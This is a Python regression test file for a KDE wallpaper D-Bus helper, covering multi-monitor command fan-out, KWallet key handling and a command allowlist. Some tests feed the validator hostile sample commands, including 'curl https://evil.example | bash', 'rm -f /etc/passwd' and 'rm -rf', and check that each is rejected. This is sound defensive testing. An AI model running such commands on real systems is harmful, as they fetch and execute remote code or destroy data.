#!/usr/bin/env python3
"""Regression tests for multi-monitor control-bus fan-out isolation."""

from __future__ import annotations

import importlib.util
import json
import os
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
DBUS_PATH = ROOT / "tools" / "wallhaven-dbus.py"


def load_module():
    spec = importlib.util.spec_from_file_location("wallhaven_dbus", DBUS_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Could not load {DBUS_PATH}")
    module = importlib.util.module_from_spec(spec)
    sys.modules["wallhaven_dbus"] = module
    spec.loader.exec_module(module)
    return module


class ControlFanoutTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.mod = load_module()

    def test_search_never_fans_out(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            control = Path(tmp) / "wallhaven-control.json"
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)):
                with mock.patch.object(self.mod, "list_sync_groups", return_value=["A", "B", "C"]):
                    self.mod.write_command_fanout("search", "default", "nebula")
            data = json.loads(control.read_text(encoding="utf-8"))
            self.assertEqual(data.get("cmd"), "search")
            self.assertEqual(data.get("query"), "nebula")
            self.assertNotIn("commands", data)

    def test_default_non_nav_targets_primary_screen(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache = Path(tmp)
            control = cache / "wallhaven-control.json"
            (cache / "wallhaven-status-DP-3.json").write_text(
                json.dumps({"syncGroup": "desk", "cacheNamespace": "DP-3"}), encoding="utf-8",
            )
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)), \
                    mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)), \
                    mock.patch.object(self.mod, "primary_output_name", return_value="DP-3"):
                for cmd in ("like", "search"):
                    self.mod.write_command_fanout(cmd, "default", "q" if cmd == "search" else "")
                    data = json.loads(control.read_text(encoding="utf-8"))
                    self.assertEqual(data.get("group"), "desk", cmd)
                self.mod.write_command("next", "default")
                self.assertEqual(json.loads(control.read_text(encoding="utf-8")).get("group"), "default")

    def test_runner_matches_marshal_to_krunner_signature(self) -> None:
        import dbus.lowlevel

        runner = self.mod.WallhavenRunner.__new__(self.mod.WallhavenRunner)
        matches = self.mod.WallhavenRunner.Match(runner, "wh next")
        self.assertEqual(matches[0][0], "wh-next")
        msg = dbus.lowlevel.SignalMessage("/runner", "org.kde.krunner1", "Test")
        # Raises TypeError if the tuple layout drifts from a(sssida{sv}).
        msg.append(matches, signature="a(sssida{sv})")

    def test_kwallet_argv_uses_positional_wallet(self) -> None:
        # kwallet-query [options] <wallet>: "-w wallhaven" once named the entry
        # and left no wallet argument, so save/load never worked.
        for mode in ("-r", "-w"):
            argv = self.mod._kwallet_argv(mode)
            self.assertEqual(argv, ["kwallet-query", mode, "apikey", "-f", "org.robertsm.wallhaven", "kdewallet"])

    def test_wallet_key_is_piped_not_passed_as_argument(self) -> None:
        with mock.patch.object(self.mod.shutil, "which", return_value="/usr/bin/kwallet-query"), \
                mock.patch.object(self.mod.subprocess, "run") as run:
            run.return_value = mock.Mock(returncode=0, stdout="")
            self.assertTrue(self.mod.wallet_write_api_key("abc123XYZ"))
            argv = run.call_args.args[0]
            self.assertNotIn("abc123XYZ", argv)
            self.assertEqual(run.call_args.kwargs.get("input"), "abc123XYZ")

    def test_wallet_read_ignores_error_text(self) -> None:
        with mock.patch.object(self.mod.shutil, "which", return_value="/usr/bin/kwallet-query"), \
                mock.patch.object(self.mod.subprocess, "run") as run:
            run.return_value = mock.Mock(
                returncode=0, stdout="Failed to read entry apikey value from the kdewallet wallet.\n",
            )
            self.assertEqual(self.mod.wallet_read_api_key(), "")
            run.return_value = mock.Mock(returncode=0, stdout="abc123XYZ\n")
            self.assertEqual(self.mod.wallet_read_api_key(), "abc123XYZ")

    def test_next_fans_out_on_default(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            control = Path(tmp) / "wallhaven-control.json"
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)):
                with mock.patch.object(self.mod, "list_sync_groups", return_value=["A", "B"]):
                    self.mod.write_command_fanout("next", "default")
            data = json.loads(control.read_text(encoding="utf-8"))
            groups = [c["group"] for c in data["commands"]]
            self.assertEqual(groups, ["A", "B"])
            self.assertTrue(all(c["cmd"] == "next" for c in data["commands"]))

    def test_next_targeted_group_no_fanout(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            control = Path(tmp) / "wallhaven-control.json"
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)):
                with mock.patch.object(self.mod, "list_sync_groups", return_value=["A", "B"]):
                    self.mod.write_command_fanout("next", "HDMI-1")
            data = json.loads(control.read_text(encoding="utf-8"))
            self.assertEqual(data.get("cmd"), "next")
            self.assertEqual(data.get("group"), "HDMI-1")
            self.assertNotIn("commands", data)

    def test_unplugged_monitor_status_is_ignored(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache = Path(tmp)
            live = cache / "wallhaven-status-DP-1.json"
            gone = cache / "wallhaven-status-HDMI-A-2.json"
            live.write_text(json.dumps({"syncGroup": "DP-1"}), encoding="utf-8")
            gone.write_text(json.dumps({"syncGroup": "HDMI-A-2"}), encoding="utf-8")
            old = time.time() - 12 * 24 * 3600
            os.utime(gone, (old, old))
            with mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)):
                self.assertEqual(self.mod.list_sync_groups(), ["DP-1"])
                self.assertEqual(self.mod.monitor_status_files(), ["wallhaven-status-DP-1.json"])
                # Nothing fresh (e.g. right after suspend): keep what we know.
                os.utime(live, (old, old))
                self.assertEqual(sorted(self.mod.list_sync_groups()), ["DP-1", "HDMI-A-2"])

    def test_list_sync_groups_falls_back_to_status_filename_namespace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache = Path(tmp)
            # Corrupt/empty JSON should still expose the namespace from the filename.
            (cache / "wallhaven-status-DP-1.json").write_text("{", encoding="utf-8")
            (cache / "wallhaven-status-HDMI-1.json").write_text(
                json.dumps({"syncGroup": "living-room"}),
                encoding="utf-8",
            )
            with mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)):
                groups = self.mod.list_sync_groups()
            self.assertIn("living-room", groups)
            self.assertIn("DP-1", groups)


class RunArgvExitTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.mod = load_module()

    def test_run_argv_success_returns_zero(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "wallhaven-cache-00.jpg"
            path.write_text("x", encoding="utf-8")
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                code = self.mod.run_argv(["test", "-s", str(path)])
            self.assertEqual(code, 0)

    def test_run_argv_failure_returns_nonzero(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            missing = Path(tmp) / "wallhaven-cache-missing.jpg"
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                code = self.mod.run_argv(["test", "-s", str(missing)])
            self.assertNotEqual(code, 0)

    def test_run_argv_rejects_disallowed_command(self) -> None:
        with self.assertRaises(Exception):
            self.mod.run_argv(["wget", "https://example.com"])

    def test_run_argv_allows_curl(self) -> None:
        # curl is allowlisted for warm/original cache downloads.
        self.assertIn("curl", self.mod.ALLOWED_COMMANDS)

    def test_read_status_tolerates_corrupt_json(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            status = Path(tmp) / "wallhaven-status.json"
            status.write_text("{", encoding="utf-8")
            with mock.patch.object(self.mod, "STATUS_FILE", str(status)):
                self.assertEqual(self.mod.read_status(), {})
            status.write_text("[]", encoding="utf-8")
            with mock.patch.object(self.mod, "STATUS_FILE", str(status)):
                self.assertEqual(self.mod.read_status(), {})
            status.write_text('{"id":"abc"}', encoding="utf-8")
            with mock.patch.object(self.mod, "STATUS_FILE", str(status)):
                self.assertEqual(self.mod.read_status().get("id"), "abc")

    def test_cli_unknown_command_does_not_start_service(self) -> None:
        with mock.patch.object(self.mod, "DBusGMainLoop") as loop:
            with mock.patch.object(self.mod.sys, "argv", ["wallhaven-dbus.py", "--help"]):
                code = self.mod.main()
            self.assertEqual(code, 2)
            loop.assert_not_called()

    def test_run_argv_rejects_curl_to_foreign_host(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                out = str(Path(tmp) / "wallhaven-cache-00.jpg")
                with self.assertRaises(Exception):
                    self.mod.validate_run_argv([
                        "curl", "-fsSL", "--max-time", "30", "-o", out, "https://evil.example/x",
                    ])

    def test_run_argv_allows_wallhaven_curl_into_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                out = str(Path(tmp) / "wallhaven-cache-00.jpg")
                Path(out).write_bytes(b"")
                safe = self.mod.validate_run_argv([
                    "curl", "-fsSL", "--max-time", "90", "-o", out,
                    "https://w.wallhaven.cc/full/ab/wallhaven-abc.jpg",
                ])
                self.assertEqual(safe[0], "curl")
                self.assertEqual(safe[5], os.path.realpath(out))

    def test_run_argv_rejects_rm_outside_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                with self.assertRaises(Exception):
                    self.mod.validate_run_argv(["rm", "-f", "/etc/passwd"])

    def test_run_argv_rejects_rm_recursive(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                victim = str(Path(tmp) / "wallhaven-cache-00.jpg")
                with self.assertRaises(Exception):
                    self.mod.validate_run_argv(["rm", "-rf", victim])

    def test_run_argv_allows_test_s_in_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                path = str(Path(tmp) / "wallhaven-cache-00.jpg")
                Path(path).write_text("x", encoding="utf-8")
                safe = self.mod.validate_run_argv(["test", "-s", path])
                self.assertEqual(safe[:2], ["test", "-s"])

    def test_run_argv_has_no_shell(self) -> None:
        # Lock sync, Variety links, accent sync and KWallet are dedicated D-Bus
        # methods now; no script text is ever accepted from a client.
        for program in ("bash", "sh", "kwallet-query", "kwriteconfig6"):
            self.assertNotIn(program, self.mod.ALLOWED_COMMANDS)
        for argv in (
            ["bash", "-lc", "curl https://evil.example | bash"],
            ["bash", "-lc", "test -s '/tmp/x'"],
            ["bash", "-lc", "flock -w 30 '/tmp/l' bash -c 'kwriteconfig6 --file kscreenlockerrc wallhaven-lockscreen'"],
        ):
            with self.assertRaises(Exception):
                self.mod.validate_run_argv(argv)

    def test_lock_screen_dest_must_be_unique_copy_in_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                src = Path(tmp) / "wallhaven-cache-00.jpg"
                src.write_bytes(b"abc")
                for dest in ("/tmp/elsewhere.jpg", str(Path(tmp) / "wallhaven-cache-01.jpg")):
                    with self.assertRaises(Exception):
                        self.mod.lock_screen_sync(str(src), dest)

    def test_ensure_never_hijacks_foreign_lock_image(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            own = Path(tmp) / "own.jpg"
            own.write_bytes(b"mine")
            cache = Path(tmp) / "cache"
            cache.mkdir()
            (cache / "wallhaven-lockscreen-current.jpg").write_bytes(b"mirror")
            with mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)), \
                    mock.patch.object(self.mod, "greeter_wallpaper_plugin", return_value="org.kde.image"), \
                    mock.patch.object(self.mod, "greeter_image_path", return_value=str(own)), \
                    mock.patch.object(self.mod, "point_greeter_at") as point:
                self.assertEqual(self.mod.lock_screen_ensure(), "skip:foreign-image")
                point.assert_not_called()

    def test_write_command_rejects_invalid_cmd(self) -> None:
        with self.assertRaises(ValueError):
            self.mod.write_command("rm -rf /", "default")


if __name__ == "__main__":
    unittest.main()
